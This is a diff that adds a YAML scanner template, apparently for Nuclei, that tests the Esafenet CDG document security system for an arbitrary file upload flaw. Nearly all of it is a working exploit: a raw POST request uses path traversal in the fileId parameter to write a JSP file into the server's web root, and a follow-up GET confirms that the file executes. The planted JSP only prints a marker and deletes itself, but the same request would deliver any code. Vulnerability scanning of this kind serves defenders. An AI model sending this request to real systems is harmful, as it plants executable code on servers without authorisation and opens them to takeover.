@@ -1,0 +1,30 @@
+id: esafenet-DecryptApplicationService2-rce
+
+info:
+  name: esafenet-DecryptApplicationService2-rce
+  author: fitz
+  severity: critical
+  description: |
+    亿赛通电子文档安全管理系统 DecryptApplicationService2 任意文件上传漏洞
+
+  tags: File Upload
+
+http:
+  - raw:
+      - |
+        POST /CDGServer3/DecryptApplicationService2?fileId=../../../Program+Files+(x86)/ESAFENET/CDocGuard+Server/tomcat64/webapps/CDGServer3/3334.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Length: 29
+        Connection: close
+
+        <% out.println("pboyjnnrfipmplsukdeczudsefxmywe");new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+      - |
+        GET /CDGServer3/3334.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+
+    matchers:
+      - type: dsl
+        name: 任意文件上传
+        dsl:
+          - "status_code==200 && contains_all(body,'pboyjnnrfipmplsukdeczudsefxmywe')"
